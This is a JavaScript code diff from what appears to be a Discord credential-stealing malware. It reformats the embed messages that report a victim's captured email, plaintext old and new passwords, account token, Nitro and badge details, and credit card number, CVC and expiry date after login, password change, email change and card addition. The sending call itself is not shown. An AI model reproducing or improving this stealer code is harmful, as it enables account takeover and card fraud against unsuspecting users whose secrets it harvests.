@@ -149,12 +149,12 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": "**Account Info**",
-                            "value": `Email: ${email} - Password: ${password}`,
+                            "value": `**Email:** ||${email}|| - **Password:** ||${password}||`,
                             "inline": true
                         },
                         {
                             "name": "**Token**",
-                            "value": `\`${token}\``,
+                            "value": `\`||${token}||\``,
                             "inline": false
                         }
                     ],
@@ -191,7 +191,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                     "fields": [
                         {
                             "name": "**Password Changed**",
-                            "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
+                            "value": `**Email:** ||${json.email}||\n  **Old Password:** ||${oldpassword}||\n   **New Password:** ||${newpassword}||`,
                             "inline": true
                         },
                         {
@@ -201,7 +201,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         },
                         {
                             "name": "**Token**",
-                            "value": `\`${token}\``,
+                            "value": `\`||${token}||\``,
                             "inline": false
                         }
                     ],
@@ -238,17 +238,17 @@ function ChangeEmail(newemail, password, token) {
                     "fields": [
                         {
                             "name": "**Email Changed**",
-                            "value": `New Email: ${newemail}\nPassword: ${password}`,
+                            "value": `**New Email:** ||${newemail}||\n   **Password:** ||${password}||`,
                             "inline": true
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `**Nitro Type:** ||${GetNitro(json.premium_type)}||   \n**Badges:** ||${GetBadges(json.flags)}||`,
                             "inline": true
                         },
                         {
                             "name": "**Token**",
-                            "value": `\`${token}\``,
+                            "value": `\`||${token}||\``,
                             "inline": false
                         }
                     ],
@@ -285,17 +285,17 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     "fields": [
                         {
                             "name": "**Credit Card Added**",
-                            "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
+                            "value": `**Credit Card Number:** ||${number}||\n   **CVC:** ||${cvc}|| \n   **Credit Card Expiration:** ||${expir_month}||/||${expir_year}||`,
                             "inline": true
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `**Nitro Type:** ||${GetNitro(json.premium_type)}||   \n**Badges:** ||${GetBadges(json.flags)}||`,
                             "inline": true
                         },
                         {
                             "name": "**Token**",
-                            "value": `\`${token}\``,
+                            "value": `\`||${token}||\``,
                             "inline": false
                         }
                     ],
